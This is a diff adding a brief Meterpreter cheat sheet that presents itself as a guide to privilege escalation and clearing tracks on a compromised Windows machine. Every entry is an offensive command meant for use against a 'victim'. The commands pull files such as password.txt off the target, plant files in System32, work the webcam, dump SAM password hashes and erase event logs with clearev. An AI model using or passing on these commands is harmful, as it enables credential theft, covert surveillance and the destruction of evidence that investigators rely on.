@@ -1,0 +1,33 @@
+Meterpreter - Guide for privilege escalation and clearing track
+
+This is use when meterpreter is used
+
++ Help command
+	# help
+
++ Download file from target machine
+	# download [filename.extension]
+	# download password.txt
+	
++ Get username of the victime
+	# getuid
+
++ Uploading file to target machine
+	++ Uploading to current directory of the meterpreter session on target machine
+		# upload [path to file in attacker machine]
+		# upload helloworld.txt
+	++ Uploading file to specific directory in the target machine
+		# upload [path to file in attacker machine] [path to folder in target machine]
+		# upload helloworld.txt C:\Windows\System32\
+		
++ help menu for webcam
+	# webcam_snap --help
+	
++ Dump password hashes from SAM file (Require administrator privilege)
+	# run post/windows/gather/hashdump
+
++ Run shell or windows command prompt (native windows command)
+	# shell
+
++ Clearing track (need to be in meterpreter, clearing event log require administrator privilege)
+	# clearev
